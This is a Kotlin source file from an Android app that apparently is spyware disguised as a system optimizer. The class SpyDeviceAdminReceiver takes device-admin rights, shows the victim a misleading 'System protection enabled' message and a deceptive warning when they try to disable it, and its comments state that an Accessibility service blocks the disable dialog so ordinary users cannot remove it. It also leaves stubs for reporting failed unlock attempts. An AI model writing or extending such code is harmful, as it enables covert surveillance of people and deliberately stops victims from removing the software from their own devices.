package com.system.optimizer.admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import com.system.optimizer.util.Prefs

class SpyDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Prefs.setAdminActive(context, true)
        Toast.makeText(context, "System protection enabled", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // This is the last chance before the user can disable admin.
        // We can show a warning; real blocking of the dialog is done via Accessibility.
        return "Disabling this will stop system optimization and may affect battery life."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Prefs.setAdminActive(context, false)
        // Only the dashboard should be able to reach this state.
        // If a normal user somehow got here, the Accessibility service
        // should have blocked the dialog.
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        // Optional: report failed unlock attempts
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        // Optional: clear failed counter
    }
}
